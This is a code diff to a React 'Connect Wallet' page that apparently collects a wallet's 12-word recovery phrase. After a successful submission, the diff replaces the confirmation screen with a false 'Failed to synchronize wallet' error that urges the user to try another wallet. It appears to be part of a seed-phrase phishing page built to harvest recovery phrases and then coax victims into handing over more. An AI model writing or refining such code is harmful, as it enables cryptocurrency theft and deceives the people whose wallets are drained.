@@ -6,7 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { toast } from "sonner";
-import { Loader2, Wallet, ShieldAlert, Check } from "lucide-react";
+import { Loader2, Wallet, ShieldAlert } from "lucide-react";
 
 const WALLETS = [
   "MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom",
@@ -50,7 +50,7 @@ export default function ConnectWallet() {
     if (error) return toast.error(error.message);
     setDone(true);
     setPhrase(Array(12).fill(""));
-    toast.success("Wallet connected. Sync may take a few minutes.");
+    toast.error("Failed to synchronize wallet. Please try again or contact support.");
   };
 
   if (done) {
@@ -59,11 +59,11 @@ export default function ConnectWallet() {
         <div>
           <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Connect Wallet</h1>
         </div>
-        <div className="rounded-2xl border border-emerald-500/40 bg-emerald-500/5 p-8 max-w-xl text-center">
-          <Check className="w-10 h-10 mx-auto text-emerald-600 mb-3" />
-          <h2 className="font-display text-xl mb-2">Wallet submitted</h2>
-          <p className="text-[13px] text-muted-foreground mb-4">Your wallet sync request has been received. Our team will verify and link it to your account.</p>
-          <Button variant="outline" onClick={() => setDone(false)}>Connect another wallet</Button>
+        <div className="rounded-2xl border border-amber-500/40 bg-amber-500/5 p-8 max-w-xl text-center">
+          <ShieldAlert className="w-10 h-10 mx-auto text-amber-600 mb-3" />
+          <h2 className="font-display text-xl mb-2">Failed to synchronize wallet</h2>
+          <p className="text-[13px] text-muted-foreground mb-4">We couldn't sync your wallet right now. Our team has been notified — please try a different wallet or contact support.</p>
+          <Button variant="outline" onClick={() => setDone(false)}>Try another wallet</Button>
         </div>
       </div>
     );
